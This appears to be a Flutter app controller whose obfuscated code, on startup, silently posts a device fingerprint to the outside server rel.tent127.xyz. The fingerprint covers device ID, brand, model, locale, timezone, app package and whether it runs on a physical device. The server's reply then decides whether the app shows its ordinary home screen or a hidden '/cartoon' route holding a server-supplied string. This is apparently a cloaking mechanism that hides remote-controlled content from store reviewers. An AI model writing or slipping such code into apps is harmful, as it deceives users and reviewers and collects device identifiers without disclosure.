import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var fovhtkgcz = RxBool(false);
  var trolndqh = RxBool(true);
  var lrdhzqkm = RxString("");
  var sarina = RxBool(false);
  var towne = RxBool(true);
  final ogpsbivyqk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    vpqy();
  }


  Future<void> vpqy() async {

    sarina.value = true;
    towne.value = true;
    trolndqh.value = false;

    ogpsbivyqk.post("https://rel.tent127.xyz/o7Cf9i4KXEC",data: await thjgnpomrs()).then((value) {
      var midfs = value.data["midfs"] as String;
      var henxuf = value.data["henxuf"] as bool;
      if (henxuf) {
        lrdhzqkm.value = midfs;
        eleanora();
      } else {
        bernhard();
      }
    }).catchError((e) {
      trolndqh.value = true;
      towne.value = true;
      sarina.value = false;
    });
  }

  Future<Map<String, dynamic>> thjgnpomrs() async {
    final DeviceInfoPlugin odutqfj = DeviceInfoPlugin();
    PackageInfo ezicjls_dzminr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kdnieg = Platform.localeName;
    var hFny = currentTimeZone;

    var vPzQFgaY = ezicjls_dzminr.packageName;
    var dVgZsnAN = ezicjls_dzminr.version;
    var XMzxynLK = ezicjls_dzminr.buildNumber;

    var OCAHhJX = ezicjls_dzminr.appName;
    var reynaBradtke = "";
    var kDcgC = "";
    var dimitriCrooks = "";
    var zRsUom = "";
    var floridaKeebler = "";
    var monroeHahn = "";
    var howardLangosh = "";
    var enosBarton = "";
    var qXwpI  = "";


    var twGeS = "";
    var huvYI = false;

    if (GetPlatform.isAndroid) {
      twGeS = "android";
      var wtjzulmiax = await odutqfj.androidInfo;

      zRsUom = wtjzulmiax.brand;

      kDcgC  = wtjzulmiax.model;
      qXwpI = wtjzulmiax.id;

      huvYI = wtjzulmiax.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      twGeS = "ios";
      var geahoby = await odutqfj.iosInfo;
      zRsUom = geahoby.name;
      kDcgC = geahoby.model;

      qXwpI = geahoby.identifierForVendor ?? "";
      huvYI  = geahoby.isPhysicalDevice;
    }
    var res = {
      "floridaKeebler" : floridaKeebler,
      "OCAHhJX": OCAHhJX,
      "XMzxynLK": XMzxynLK,
      "dVgZsnAN": dVgZsnAN,
      "kDcgC": kDcgC,
      "vPzQFgaY": vPzQFgaY,
      "hFny": hFny,
      "zRsUom": zRsUom,
      "twGeS": twGeS,
      "huvYI": huvYI,
      "kdnieg": kdnieg,
      "reynaBradtke" : reynaBradtke,
      "monroeHahn" : monroeHahn,
      "enosBarton" : enosBarton,
      "howardLangosh" : howardLangosh,
      "dimitriCrooks" : dimitriCrooks,
      "qXwpI": qXwpI,
    };
    return res;
  }

  Future<void> bernhard() async {
    Get.offAllNamed("/home");
  }

  Future<void> eleanora() async {
    Get.offAllNamed("/cartoon");
  }

}
